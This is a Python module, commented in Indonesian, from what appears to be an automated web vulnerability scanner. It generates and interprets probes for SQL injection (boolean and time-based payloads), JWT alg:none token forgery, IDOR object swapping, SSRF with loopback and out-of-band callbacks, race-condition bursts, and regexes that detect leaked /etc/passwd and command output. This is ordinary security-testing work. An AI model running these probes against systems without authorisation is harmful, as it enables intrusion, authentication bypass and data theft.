"""Technique hanya menyusun probe dan menafsirkan hasil — bukan transport.

Setiap kelas memakai grammar sintesis yang sama (`hunt/synthesis.py`), lalu
menambahkan kontrol yang memang khas kelas (SQLi boolean true/false, mis.).
Verdict tetap dari `verify/deterministic.py`; teknik tidak boleh mengarang
`verified` tanpa sinyal.
"""

from __future__ import annotations

import base64
import json
import re
import time
from dataclasses import dataclass
from typing import Any, Iterable, Protocol, Sequence
from urllib.parse import unquote, urlsplit, urlunsplit

from wth_ai.hunt.synthesis import ServerProfile, SynthProbe, synthesize_payloads
from wth_ai.pipeline.models import (
    Parameter,
    ProbeOutcome,
    ProbePlan,
    RequestSpec,
    Surface,
    TechniqueResult,
)
from wth_ai.state.normalizer import Observation
from wth_ai.verify.deterministic import SQL_ERROR_RE, normalize_class, verify_pair

SQL_ERROR_TEXT = re.compile(
    r"(you have an error in your sql syntax|sql syntax.*error|mysql_fetch|"
    r"sqlite(?:_| )error|postgresql.*error|pg::syntaxerror|ora-\d{4,}|"
    r"unclosed quotation mark|syntax error at or near|quoted string not properly terminated)",
    re.IGNORECASE,
)
UID_TEXT = re.compile(r"uid=\d+\([^)]*\)\s+gid=\d+\(", re.IGNORECASE)
PASSWD_TEXT = re.compile(r"root:x:0:0:", re.IGNORECASE)


class Technique(Protocol):
    """Kontrak minimum yang dipakai runner — bukan transport, bukan executor."""

    vuln_class: str
    requires_parameter: bool
    probe_budget: int

    def plans(
        self, surface: Surface, baseline: Observation, baseline_body: str,
        *, context: dict[str, Any] | None = None,
    ) -> list[ProbePlan]: ...

    def interpret(
        self, surface: Surface, baseline: Observation, baseline_body: str,
        outcomes: Sequence[ProbeOutcome], *, context: dict[str, Any] | None = None,
    ) -> TechniqueResult: ...

    def early_verified(
        self, baseline: Observation, baseline_body: str, outcome: ProbeOutcome,
    ) -> bool: ...


def _pair(observation: Observation, body: str, role: str) -> dict[str, Any]:
    return {
        "role": role,
        "method": observation.method,
        "url": observation.url,
        "response_status": observation.status,
        "body_snippet": (body or observation.snippet)[:4000],
        "response_headers": dict(observation.headers),
        "elapsed_ms": observation.elapsed_ms,
        "transcript_id": observation.transcript_id,
    }


def _profile(surface: Surface, baseline: Observation, baseline_body: str) -> ServerProfile:
    return ServerProfile.from_pair({
        "method": surface.method,
        "url": surface.url,
        "body": surface.body,
        "response_status": baseline.status,
        "body_snippet": baseline_body,
        "response_headers": dict(baseline.headers),
    })


def _request_from_probe(probe: dict[str, Any]) -> RequestSpec:
    return RequestSpec(
        method=str(probe.get("method") or "GET").upper(),
        url=str(probe.get("url") or ""),
        headers={str(k): str(v) for k, v in (probe.get("headers") or {}).items()},
        body=str(probe.get("body") or ""),
        follow_redirects=bool(probe.get("follow_redirects", True)),
    )


def _from_synth(item: SynthProbe) -> ProbePlan:
    return ProbePlan(
        title=item.title,
        request=_request_from_probe(item.probe),
        expected=tuple(item.expected),
        rationale=item.rationale,
        role=f"probe:{item.context or item.vuln_class}",
        risk=item.risk,
        meta={"vuln_class": item.vuln_class, "context": item.context},
    )


@dataclass
class SynthesizedTechnique:
    """Teknik generik: rencana dari sintesis respons + verdict deterministik."""

    vuln_class: str
    max_plans: int = 4
    requires_parameter: bool = True
    probe_budget: int = 12

    def plans(
        self, surface: Surface, baseline: Observation, baseline_body: str,
        *, context: dict[str, Any] | None = None,
    ) -> list[ProbePlan]:
        profile = _profile(surface, baseline, baseline_body)
        out: list[ProbePlan] = []
        for parameter in surface.params[:2]:
            # Profil endpoint yang sama, tetapi param yang sedang diuji harus
            # menjadi fokus grammar (khususnya untuk body JSON/form).
            local = ServerProfile.from_pair({
                "method": surface.method,
                "url": surface.request_for(parameter, parameter.value).url,
                "body": surface.request_for(parameter, parameter.value).body,
                "response_status": baseline.status,
                "body_snippet": baseline_body,
                "response_headers": dict(baseline.headers),
            })
            candidates = synthesize_payloads(local, self.vuln_class, limit=self.max_plans)
            if not candidates and profile.param:
                candidates = synthesize_payloads(profile, self.vuln_class, limit=self.max_plans)
            out.extend(_from_synth(item) for item in candidates)
        return out[: max(1, self.max_plans)]

    def interpret(
        self,
        surface: Surface,
        baseline: Observation,
        baseline_body: str,
        outcomes: Sequence[ProbeOutcome],
        *,
        context: dict[str, Any] | None = None,
    ) -> TechniqueResult:
        base_pair = _pair(baseline, baseline_body, "baseline")
        result = TechniqueResult()
        for outcome in outcomes:
            verdict = verify_pair(
                self.vuln_class,
                base_pair,
                outcome.pair,
                expected=outcome.plan.expected,
            )
            result.verdicts.append(verdict.to_dict())
            if verdict.verdict == "verified":
                result.verified = True
                result.evidence.extend(verdict.reasons)
                self._class_evidence(result, outcome)
            elif verdict.verdict == "false_positive":
                result.observations.append(f"false-positive: {'; '.join(verdict.reasons)}")
            elif verdict.verdict == "needs_more_evidence":
                result.observations.append(f"needs-evidence: {'; '.join(verdict.reasons)}")
        if result.verified:
            result.risk = "critical" if self.vuln_class in {"cmdi", "command_injection"} else "high"
        return result

    def early_verified(
        self, baseline: Observation, baseline_body: str, outcome: ProbeOutcome,
    ) -> bool:
        verdict = verify_pair(
            self.vuln_class,
            _pair(baseline, baseline_body, "baseline"),
            outcome.pair,
            expected=outcome.plan.expected,
        )
        return verdict.verdict == "verified"

    def _class_evidence(self, result: TechniqueResult, outcome: ProbeOutcome) -> None:
        body = outcome.body or ""
        low = body.lower()
        if self.vuln_class == "xss":
            if any(token in low for token in ("<svg", "onerror=", "onfocus=", "<script")):
                result.evidence.append("payload tercermin mentah (unescaped)")
        elif self.vuln_class == "ssti":
            computed = next((m for m in outcome.plan.expected if str(m).isdigit()), "")
            if computed:
                result.evidence.append(f"nilai komputasi `{computed}` muncul — template dievaluasi server-side")
            else:
                result.evidence.append("template dievaluasi server-side")
        elif self.vuln_class in {"cmdi", "command_injection"}:
            match = UID_TEXT.search(body)
            if match:
                result.evidence.append(f"Command output: {match.group(0)}")
        elif self.vuln_class == "path_traversal":
            if PASSWD_TEXT.search(body):
                result.evidence.append("File marker: root:x:0:0:")
        elif self.vuln_class == "ssrf":
            if "TERBUKTI" in body:
                idx = body.find("TERBUKTI")
                result.evidence.append(body[max(0, idx - 20):idx + 120])


class SqliTechnique(SynthesizedTechnique):
    """SQLi butuh kontrol boolean true/false + sinyal waktu, bukan satu probe."""

    vuln_class = "sqli"

    def plans(
        self, surface: Surface, baseline: Observation, baseline_body: str,
        *, context: dict[str, Any] | None = None,
    ) -> list[ProbePlan]:
        plans = super().plans(surface, baseline, baseline_body, context=context)
        for parameter in surface.params[:1]:
            original = str(parameter.value or "")
            quote = "" if re.fullmatch(r"-?\d+", original) else "'"
            true_value = f"{original}{quote} AND 1=1{quote}"
            false_value = f"{original}{quote} AND 1=2{quote}"
            plans.append(ProbePlan(
                title=f"SQLi boolean true ({parameter.name})",
                request=surface.request_for(parameter, true_value),
                expected=("boolean_true",),
                rationale="Kontrol boolean true harus menyerupai baseline.",
                role="boolean_true",
                meta={"vuln_class": "sqli", "parameter": parameter.name},
            ))
            plans.append(ProbePlan(
                title=f"SQLi boolean false ({parameter.name})",
                request=surface.request_for(parameter, false_value),
                expected=("boolean_false",),
                rationale="Kontrol boolean false harus berbeda dari true/baseline.",
                role="boolean_false",
                meta={"vuln_class": "sqli", "parameter": parameter.name},
            ))
            # Time-based tidak bisa bergantung pada DBMS yang belum diketahui
            # dari baseline (baseline normal tidak menghasilkan error). Kirim
            # tiga dialek umum; yang tidak cocok akan error tanpa delay.
            for dialect, payload in (
                ("mysql", f"{original}{quote} AND SLEEP(2){quote}"),
                ("postgres", f"{original}{quote}; SELECT pg_sleep(2){quote}"),
                ("mssql", f"{original}{quote}; WAITFOR DELAY '0:0:2'{quote}"),
            ):
                plans.append(ProbePlan(
                    title=f"SQLi time {dialect} ({parameter.name})",
                    request=surface.request_for(parameter, payload),
                    expected=("time_delta>=2s",),
                    rationale=f"Time-based {dialect}: respons tertunda menunjukkan query dieksekusi.",
                    role="time",
                    meta={"vuln_class": "sqli", "parameter": parameter.name, "dialect": dialect},
                ))
        return plans

    def interpret(
        self,
        surface: Surface,
        baseline: Observation,
        baseline_body: str,
        outcomes: Sequence[ProbeOutcome],
        *,
        context: dict[str, Any] | None = None,
    ) -> TechniqueResult:
        base_pair = _pair(baseline, baseline_body, "baseline")
        result = TechniqueResult()
        true_out = next((o for o in outcomes if o.plan.role == "boolean_true"), None)
        false_out = next((o for o in outcomes if o.plan.role == "boolean_false"), None)

        for outcome in outcomes:
            if outcome.plan.role in {"boolean_true", "boolean_false"}:
                continue
            verdict = verify_pair("sqli", base_pair, outcome.pair, expected=outcome.plan.expected)
            result.verdicts.append(verdict.to_dict())
            if verdict.verdict == "verified":
                result.verified = True
                match = SQL_ERROR_TEXT.search(outcome.body or "")
                if match:
                    result.evidence.append(
                        f"Error SQL bocor: `{match.group(0)}` pada {outcome.observation.url}"
                    )
                if outcome.observation.elapsed_ms >= 2000 and baseline.elapsed_ms < 1000:
                    result.evidence.append(
                        f"Time-blind: respons {outcome.observation.elapsed_ms:.0f}ms "
                        f"(baseline {baseline.elapsed_ms:.0f}ms)"
                    )
                if not match:
                    result.evidence.extend(verdict.reasons)

        if true_out and false_out and baseline.status and true_out.observation.status:
            len_base = baseline.body_length
            len_true = true_out.observation.body_length
            len_false = false_out.observation.body_length
            true_like_base = (
                true_out.observation.status == baseline.status
                and abs(len_true - len_base) <= max(60, int(0.08 * max(len_base, 1)))
            )
            false_differs = (
                false_out.observation.status != true_out.observation.status
                or abs(len_false - len_true) > max(40, int(0.12 * max(len_true, 1)))
            )
            if true_like_base and false_differs:
                result.verified = True
                result.evidence.append(
                    f"Boolean-blind: `AND 1=1` ~baseline (len={len_true}/status={true_out.observation.status}), "
                    f"`AND 1=2` berbeda (len={len_false}/status={false_out.observation.status})"
                )

        if result.verified:
            result.risk = "high"
        return result

    def early_verified(
        self, baseline: Observation, baseline_body: str, outcome: ProbeOutcome,
    ) -> bool:
        # Error/time SQL boleh muncul di probe sintesis pertama. Berhenti di
        # situ akan melewatkan pasangan boolean 1=1 vs 1=2 -- dua sinyal yang
        # justru membedakan SQLi dari error generik. Kontrol boolean adalah
        # bagian dari anggaran minimum, bukan probe opsional.
        if outcome.plan.role == "time" and outcome.observation.elapsed_ms >= 2000:
            return True
        return False


_ID_NAMES = {"id", "user_id", "uuid", "account_id", "object_id", "order_id",
             "invoice_id", "document_id", "file_id", "profile_id", "tenant_id"}
_OBJECT_SEGMENT = re.compile(r"^(?:\d{1,12}|[0-9a-fA-F]{8,36}|[0-9a-fA-F-]{16,36})$")


def _neighbour(value: str) -> str:
    if value.isdigit():
        return str(int(value) + 1)
    if len(value) > 1:
        head, last = value[:-1], value[-1]
        return head + ("2" if last != "2" else "3")
    return value


class IdorTechnique(SynthesizedTechnique):
    """IDOR/BOLA object-swap tanpa akun.

    Multi-role tetap ditangani executor (butuh SessionEngine dua akun); teknik
    ini menangani kasus paling umum: endpoint membocorkan objek lewat path/query
    tanpa autentikasi sama sekali.
    """

    vuln_class = "idor"
    requires_parameter = False
    probe_budget = 4
    label = "IDOR object-swap (tanpa akun)"

    def __init__(self, vuln_class: str = "idor", max_plans: int = 4) -> None:
        super().__init__(vuln_class=vuln_class, max_plans=max_plans)
        # Dataclass induk menulis default field di __init__; tegakkan kontrak
        # subclass supaya pipeline tidak menolak target path-only (tanpa query).
        self.requires_parameter = False
        self.probe_budget = 4

    def plans(
        self, surface: Surface, baseline: Observation, baseline_body: str,
        *, context: dict[str, Any] | None = None,
    ) -> list[ProbePlan]:
        candidates: list[tuple[str, str, Any]] = []
        for parameter in surface.params:
            if parameter.name.lower() not in _ID_NAMES and not parameter.name.lower().endswith(("_id", "id")):
                continue
            original = str(parameter.value or "")
            if not original:
                continue
            candidates.append(("query", original, parameter))
        parsed = urlsplit(surface.url)
        segments = parsed.path.split("/")
        for index, segment in enumerate(segments):
            if _OBJECT_SEGMENT.fullmatch(segment):
                candidates.append(("path", segment, index))

        plans: list[ProbePlan] = []
        for location, original, ref in candidates[:3]:
            other = _neighbour(original)
            if other == original:
                continue
            if location == "query":
                request = surface.request_for(ref, other)
            else:
                new_segments = list(segments)
                new_segments[ref] = other
                request = RequestSpec(
                    surface.method,
                    urlunsplit((parsed.scheme, parsed.netloc, "/".join(new_segments),
                                parsed.query, parsed.fragment)),
                    dict(surface.headers),
                    surface.body,
                    surface.follow_redirects if hasattr(surface, "follow_redirects") else True,
                )
            plans.append(ProbePlan(
                title=f"IDOR object swap {original} -> {other} ({location})",
                request=request,
                expected=("object_swap",),
                rationale="Identifier objek diganti ke tetangganya; bila respons 200 berisi objek berbeda, otorisasi objek tidak ditegakkan.",
                role="probe:object_swap",
                risk="medium",
                meta={"vuln_class": "idor", "original": original, "other": other, "location": location},
            ))
        return plans

    def interpret(
        self,
        surface: Surface,
        baseline: Observation,
        baseline_body: str,
        outcomes: Sequence[ProbeOutcome],
        *,
        context: dict[str, Any] | None = None,
    ) -> TechniqueResult:
        result = TechniqueResult()
        if not outcomes:
            result.observations.append("Tidak ada parameter/segmen objek (id/uuid) untuk diuji")
            return result
        base_pair = _pair(baseline, baseline_body, "baseline")
        denied: list[str] = []
        hinted = False
        for outcome in outcomes:
            verdict = verify_pair("idor", base_pair, outcome.pair, expected=outcome.plan.expected)
            result.verdicts.append(verdict.to_dict())
            if verdict.verdict == "verified":
                result.verified = True
                meta = outcome.plan.meta
                result.evidence.append(
                    f"Objek {meta.get('other')} dapat dibaca tanpa otorisasi "
                    f"(isi berbeda dari {meta.get('original')})"
                )
                low = (outcome.body or "").lower()
                if any(token in low for token in ('"id"', '"email"', '"name"', '"role"', '"user"')):
                    result.evidence.append(
                        "Respons berisi field objek (id/email/name/role) — data milik objek lain"
                    )
            elif verdict.verdict == "false_positive":
                if outcome.observation.status in (401, 403):
                    denied.append(f"{outcome.observation.status} pada objek tetangga")
                else:
                    hinted = True
                    result.observations.append(f"false-positive: {'; '.join(verdict.reasons)}")
            else:
                hinted = True
                result.observations.append(f"needs-evidence: {'; '.join(verdict.reasons)}")

        if result.verified:
            result.risk = "high"
        elif denied:
            result.evidence.append(
                "Akses ditolak (401/403) — otorisasi tampak ditegakkan pada jalur ini"
            )
            result.observations.append("; ".join(denied))
            result.risk = "low"
        else:
            result.risk = "low"
            if not hinted:
                result.observations.append("Tidak ada sinyal IDOR jelas dari pertukaran objek")
        return result


def _forge_alg_none(header_b64: str, payload_b64: str) -> str:
    try:
        pad = lambda value: value + "=" * (-len(value) % 4)
        header = json.loads(base64.urlsafe_b64decode(pad(header_b64)))
        header["alg"] = "none"
        new_header = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        return f"{new_header}.{payload_b64}."
    except Exception:
        return ""


class AuthTechnique(SynthesizedTechnique):
    """JWT alg:none / auth bypass yang bisa dibuktikan dengan satu request.

    Login/enumerasi/default-credential tetap di executor karena butuh urutan
    beberapa request dan rate-limit login yang berbeda. Teknik ini mengambil
    alih bagian yang paling sering false-positive: klaim "JWT forge berhasil".
    """

    vuln_class = "auth"
    requires_parameter = False
    probe_budget = 3
    label = "Auth/JWT alg:none"

    def __init__(self, vuln_class: str = "auth", max_plans: int = 1) -> None:
        super().__init__(vuln_class=vuln_class, max_plans=max_plans)
        self.requires_parameter = False
        self.probe_budget = 3

    def _jwt(self, context: dict[str, Any] | None) -> str:
        metadata = dict((context or {}).get("metadata") or {})
        state = (context or {}).get("state")
        if not metadata and state is not None:
            metadata = dict(getattr(state, "metadata", {}) or {})
        return str(metadata.get("captured_jwt") or "")

    def plans(
        self, surface: Surface, baseline: Observation, baseline_body: str,
        *, context: dict[str, Any] | None = None,
    ) -> list[ProbePlan]:
        jwt = self._jwt(context)
        if not jwt or jwt.count(".") != 2:
            return []
        header_b64, payload_b64, _ = jwt.split(".")
        forged = _forge_alg_none(header_b64, payload_b64)
        if not forged:
            return []
        headers = dict(surface.headers)
        headers["Authorization"] = f"Bearer {forged}"
        return [ProbePlan(
            title="JWT alg:none forge",
            request=RequestSpec(surface.method.upper(), surface.url, headers, surface.body),
            expected=("forged_token_accepted",),
            rationale="Header alg diganti none dan signature dikosongkan; bila probe 200 saat baseline 401/403, verifier menandai bypass.",
            role="probe:jwt_alg_none",
            risk="critical",
            meta={"vuln_class": "auth"},
        )]

    def interpret(
        self, surface: Surface, baseline: Observation, baseline_body: str,
        outcomes: Sequence[ProbeOutcome], *, context: dict[str, Any] | None = None,
    ) -> TechniqueResult:
        result = TechniqueResult()
        jwt = self._jwt(context)
        if not jwt or jwt.count(".") != 2:
            result.observations.append("Tidak ada JWT captured — login probe tetap dijalankan executor")
            result.risk = "low"
            return result

        header_b64, payload_b64, _ = jwt.split(".")
        try:
            pad = lambda value: value + "=" * (-len(value) % 4)
            header = json.loads(base64.urlsafe_b64decode(pad(header_b64)))
            payload = json.loads(base64.urlsafe_b64decode(pad(payload_b64)))
            result.observations.append(f"alg={header.get('alg')}")
            if str(header.get("alg", "")).lower() == "none":
                result.evidence.append("JWT uses alg:none")
            if "exp" not in payload:
                result.evidence.append("JWT missing exp claim")
            if payload.get("role") == "admin" or payload.get("admin") is True:
                result.observations.append("Token contains admin claim")
        except Exception as exc:
            result.observations.append(f"JWT parse error: {exc}")

        base_pair = _pair(baseline, baseline_body, "baseline")
        for outcome in outcomes:
            verdict = verify_pair("auth", base_pair, outcome.pair, expected=outcome.plan.expected)
            result.verdicts.append(verdict.to_dict())
            if verdict.verdict == "verified":
                result.verified = True
                result.evidence.append("alg:none forged token accepted")
                result.observations.append(f"forged_status={outcome.observation.status}")
            elif verdict.verdict == "false_positive":
                result.evidence.append("JWT forged token ditolak (otorisasi bekerja)")
            else:
                result.observations.append(f"needs-evidence: {'; '.join(verdict.reasons)}")

        if not outcomes:
            result.observations.append("Tidak ada probe JWT yang bisa dijalankan")
        result.risk = "critical" if (result.verified or "JWT uses alg:none" in result.evidence) else "medium"
        if not result.evidence and not result.verified:
            result.risk = "low"
        return result


_SSRF_MARKERS = ("url", "redirect", "next", "callback", "dest", "target", "uri", "link")


def _ssrf_marker(html: str) -> str:
    for pattern in (r"<title[^>]*>([^<]{6,80})</title>", r"<h1[^>]*>([^<]{6,80})</h1>"):
        match = re.search(pattern, html or "", re.IGNORECASE)
        if match:
            text = match.group(1).strip()
            if text:
                return text
    stripped = " ".join((html or "").split())
    return stripped[:60] if len(stripped) >= 20 else ""


class SsrfTechnique(SynthesizedTechnique):
    """SSRF dengan bukti isi: target harus mengambil resource internal yang unik.

    Baseline sengaja memakai URL placeholder (`wth-ssrf-probe`) supaya perilaku
    sinkron/scope-guard lama tetap: request pertama adalah probe, bukan halaman
    asli. Setelah baseline, custom runner mengambil halaman root target untuk
    memperoleh penanda, lalu meminta server mengambil loopback root dan hanya
    menandai verified bila penanda muncul dan tidak muncul di baseline.
    """

    vuln_class = "ssrf"
    requires_parameter = False
    probe_budget = 4
    label = "SSRF content proof"

    def __init__(self, vuln_class: str = "ssrf", max_plans: int = 4) -> None:
        super().__init__(vuln_class=vuln_class, max_plans=max_plans)
        self.requires_parameter = False
        self.probe_budget = 4

    def _url_param(self, surface: Surface) -> Parameter | None:
        for parameter in surface.params:
            if parameter.location != "query":
                continue
            name = parameter.name.lower()
            if name in _SSRF_MARKERS or any(marker in name for marker in _SSRF_MARKERS):
                return parameter
        return None

    def baseline_request(
        self, surface: Surface, *, context: dict[str, Any] | None = None,
    ) -> RequestSpec | None:
        parameter = self._url_param(surface)
        if parameter is None:
            return None
        return surface.request_for(parameter, "http://127.0.0.1:1/wth-ssrf-probe")

    def plans(
        self, surface: Surface, baseline: Observation, baseline_body: str,
        *, context: dict[str, Any] | None = None,
    ) -> list[ProbePlan]:
        # Urutan request dikendalikan run_probes (butuh reference page dulu).
        return []

    def run_probes(
        self,
        session: Any,
        surface: Surface,
        baseline: Observation,
        plans: Sequence[ProbePlan],
        *,
        context: dict[str, Any] | None = None,
        budget: int = 4,
        deadline_s: float | None = None,
        started: float | None = None,
    ) -> list[ProbeOutcome]:
        parameter = self._url_param(surface)
        if parameter is None:
            return []
        parsed = urlsplit(surface.url)
        root_url = urlunsplit((parsed.scheme, parsed.netloc, "/", "", ""))
        reference_plan = ProbePlan(
            title="SSRF reference page",
            request=RequestSpec("GET", root_url, dict(surface.headers)),
            role="reference",
            rationale="Ambil penanda unik halaman root target sebagai bukti konten.",
            risk="low",
        )
        reference, reference_body = session.send(reference_plan.request, role="reference")
        outcomes = [ProbeOutcome(plan=reference_plan, observation=reference, body=reference_body)]

        marker = _ssrf_marker(reference_body)
        if not marker:
            oob = self._oob_outcome(session, surface, parameter, context)
            if oob is not None:
                outcomes.append(oob)
            return outcomes
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        internal_url = f"http://127.0.0.1:{port}/"
        plan = ProbePlan(
            title=f"SSRF internal fetch via {parameter.name}",
            request=surface.request_for(parameter, internal_url),
            expected=(marker,),
            role="probe:ssrf",
            rationale="Server diminta mengambil root loopback; penanda harus muncul di respons.",
            risk="high",
            meta={"param": parameter.name, "internal_url": internal_url, "marker": marker},
        )
        observation, body = session.send(plan.request, role=plan.role)
        outcomes.append(ProbeOutcome(plan=plan, observation=observation, body=body))

        # Blind SSRF: bila isi tidak membuktikan apa pun, coba callback OOB.
        # Listener TIDAK pernah dibuka di sini; hanya dipakai bila operator
        # sudah menyalakannya. Tanpa listener tidak ada request tambahan.
        if not (marker and marker in body):
            oob = self._oob_outcome(session, surface, parameter, context)
            if oob is not None:
                outcomes.append(oob)
        return outcomes

    def _oob_outcome(
        self, session: Any, surface: Surface, parameter: Parameter,
        context: dict[str, Any] | None,
    ) -> ProbeOutcome | None:
        from wth_ai.oob import format_hits, get_oob_service

        try:
            svc = get_oob_service()
            if not svc.running or not svc.base_url:
                return None
            callback_url = svc.base_url
            target_host = (urlsplit(surface.url).hostname or "").lower()
            callback_host = (urlsplit(callback_url).hostname or "").lower()
            loopback = {"127.0.0.1", "localhost", "::1"}
            if target_host not in loopback and callback_host in loopback:
                # Callback loopback tidak bisa dijangkau target remote.
                return None
            state = (context or {}).get("state")
            task = (context or {}).get("task")
            entry = svc.create(
                label=f"blind-ssrf:{(getattr(task, 'id', '') or 'probe')}",
                session_id=getattr(state, "session_id", ""),
                target=getattr(getattr(state, "scope", None), "target", ""),
            )
            plan = ProbePlan(
                title=f"SSRF OOB callback via {parameter.name}",
                request=surface.request_for(parameter, entry["url"]),
                expected=(),
                role="probe:oob",
                rationale="Kirim URL listener kita; hit membuktikan server target benar-benar callback.",
                risk="high",
                meta={"token": entry["token"], "callback_url": entry["url"]},
            )
            observation, body = session.send(plan.request, role=plan.role)
            hits: list[dict[str, Any]] = []
            deadline = time.monotonic() + 1.0
            while time.monotonic() < deadline:
                hits = svc.store.hits(entry["token"])
                if hits:
                    break
                time.sleep(0.05)
            plan.meta["hits"] = hits
            if hits:
                body = format_hits(entry, hits)
                transcripts = (context or {}).get("transcripts")
                if transcripts is not None:
                    try:
                        plan.meta["transcript_id"] = svc.record_as_transcript(
                            transcripts, token=entry["token"], entry=entry, hits=hits,
                        )
                    except Exception:  # noqa: BLE001
                        plan.meta["transcript_id"] = ""
            return ProbeOutcome(plan=plan, observation=observation, body=body)
        except Exception:  # noqa: BLE001
            return None

    def interpret(
        self,
        surface: Surface,
        baseline: Observation,
        baseline_body: str,
        outcomes: Sequence[ProbeOutcome],
        *,
        context: dict[str, Any] | None = None,
    ) -> TechniqueResult:
        result = TechniqueResult()
        parameter = self._url_param(surface)
        if parameter is None:
            result.observations.append("No URL-like param found (url/redirect/next/callback/dest/target/uri/link)")
            return result
        reference = next((o for o in outcomes if o.plan.role == "reference"), None)
        probe = next((o for o in outcomes if o.plan.role == "probe:ssrf"), None)
        marker = _ssrf_marker(reference.body) if reference is not None else ""
        if reference is not None:
            result.observations.append(f"reference_status={reference.observation.status}")
        oob = next((o for o in outcomes if o.plan.role == "probe:oob"), None)
        if oob is not None:
            hits = oob.plan.meta.get("hits") or []
            result.observations.append(f"oob_hits={len(hits)}")
            if hits:
                token = str(oob.plan.meta.get("token", ""))[:12]
                remote = hits[-1].get("remote") or "?"
                result.verified = True
                result.risk = "high"
                tx = str(oob.plan.meta.get("transcript_id") or "")
                suffix = f"; bukti [TX:{tx}]" if tx else ""
                result.evidence.append(
                    f"TERBUKTI (OOB): server target menghubungi callback kita — "
                    f"{len(hits)} hit token {token}… dari {remote}; URL callback "
                    f"{oob.plan.meta.get('callback_url', '')}{suffix}"
                )
        if probe is not None:
            result.observations.append(f"internal_status={probe.observation.status}")
            if marker and marker in probe.body and marker not in baseline_body:
                result.verified = True
                result.risk = "high"
                internal_url = probe.plan.meta.get("internal_url", "")
                result.evidence.append(
                    f"TERBUKTI: isi halaman internal ({internal_url}) muncul di respons via param "
                    f"`{parameter.name}` — penanda {marker[:40]!r} ditemukan, server benar-benar "
                    "mengambil URL loopback"
                )
            elif marker:
                result.observations.append(
                    "Penanda reference muncul juga di baseline/probe; bukan bukti pengambilan internal"
                )
        if not result.verified:
            if baseline.status in (500, 502, 504):
                result.evidence.append(
                    f"Indikasi (lemah): server error saat diminta URL internal via {parameter.name}"
                )
            low = (baseline_body or "").lower()
            if "connection refused" in low or "127.0.0.1" in low:
                result.evidence.append(
                    f"Indikasi (lemah): error jaringan internal terefleksi untuk param {parameter.name}"
                )
            result.risk = "medium" if result.evidence else "low"
        return result


class RaceTechnique(SynthesizedTechnique):
    """Burst paralel 20 request — hanya kelas race yang boleh memakai ini."""

    vuln_class = "race"
    requires_parameter = False
    probe_budget = 20
    label = "Race burst"

    def __init__(self, vuln_class: str = "race", max_plans: int = 20) -> None:
        super().__init__(vuln_class=vuln_class, max_plans=max_plans)
        self.requires_parameter = False
        self.probe_budget = 20

    def _method(self, surface: Surface, context: dict[str, Any] | None) -> str:
        task = (context or {}).get("task")
        text = " ".join(str(x) for x in (getattr(task, "command_plan", None) or []))
        if "POST" in text.upper():
            return "POST"
        return (surface.method or "GET").upper()

    def plans(
        self, surface: Surface, baseline: Observation, baseline_body: str,
        *, context: dict[str, Any] | None = None,
    ) -> list[ProbePlan]:
        method = self._method(surface, context)
        request = RequestSpec(method, surface.url, dict(surface.headers), surface.body)
        return [
            ProbePlan(
                title=f"Race burst #{index + 1} {method}",
                request=request,
                expected=("race",),
                rationale="Request identik dikirim serentak; >1 respons 2xx pada resource sekali-pakai adalah sinyal balapan.",
                role="probe:race",
                risk="medium",
                meta={"vuln_class": "race", "method": method},
            )
            for index in range(20)
        ]

    def run_probes(
        self,
        session: Any,
        surface: Surface,
        baseline: Observation,
        plans: Sequence[ProbePlan],
        *,
        context: dict[str, Any] | None = None,
        budget: int = 20,
        deadline_s: float | None = None,
        started: float | None = None,
    ) -> list[ProbeOutcome]:
        items = list(plans)[: max(1, int(budget))]
        if not items:
            return []
        outcomes = session.burst(items, baseline)
        if items[0].request.method == "GET" and all(
            outcome.observation.status in (404, 405, 0) for outcome in outcomes
        ):
            post_items = [
                ProbePlan(
                    title=plan.title.replace("GET", "POST", 1),
                    request=RequestSpec("POST", plan.request.url, dict(plan.request.headers), plan.request.body),
                    expected=plan.expected,
                    rationale=plan.rationale,
                    role=plan.role,
                    risk=plan.risk,
                    meta={**plan.meta, "method": "POST"},
                )
                for plan in items
            ]
            outcomes = session.burst(post_items, baseline)
        return outcomes

    def interpret(
        self,
        surface: Surface,
        baseline: Observation,
        baseline_body: str,
        outcomes: Sequence[ProbeOutcome],
        *,
        context: dict[str, Any] | None = None,
    ) -> TechniqueResult:
        result = TechniqueResult()
        if not outcomes:
            result.observations.append("Tidak ada request burst yang dijalankan")
            return result
        method = outcomes[0].plan.request.method
        statuses = [outcome.observation.status for outcome in outcomes]
        success = [outcome for outcome in outcomes if 200 <= outcome.observation.status < 300]
        result.observations.extend([
            f"method={method}",
            f"2xx_count={len(success)}",
            f"statuses_sample={statuses[:5]}",
        ])
        if len(success) > 1:
            result.verified = True
            result.risk = "high"
            result.evidence.append(
                f"{len(success)}/{len(outcomes)} request {method} paralel mengembalikan 2xx — kemungkinan race"
            )
            distinct = {outcome.body for outcome in success}
            if len(distinct) > 1:
                result.evidence.append(
                    f"{len(distinct)} bentuk respons sukses berbeda — status berubah di tengah burst"
                )
        else:
            result.observations.append("Tidak ada jendela race yang terdeteksi (<=1 respons 2xx)")
            result.risk = "low"
        return result


def technique_classes() -> dict[str, type[Technique]]:
    return {
        "sqli": SqliTechnique,
        "xss": SynthesizedTechnique,
        "ssti": SynthesizedTechnique,
        "cmdi": SynthesizedTechnique,
        "command_injection": SynthesizedTechnique,
        "path_traversal": SynthesizedTechnique,
        "lfi": SynthesizedTechnique,
        "file_path": SynthesizedTechnique,
        "open_redirect": SynthesizedTechnique,
        "idor": IdorTechnique,
        "auth": AuthTechnique,
        "race": RaceTechnique,
        "ssrf": SsrfTechnique,
    }


def get_technique(vuln_class: str) -> Technique | None:
    klass = normalize_class(vuln_class)
    cls = technique_classes().get(klass) or technique_classes().get((vuln_class or "").lower())
    if cls is None:
        return None
    return cls(vuln_class=klass)
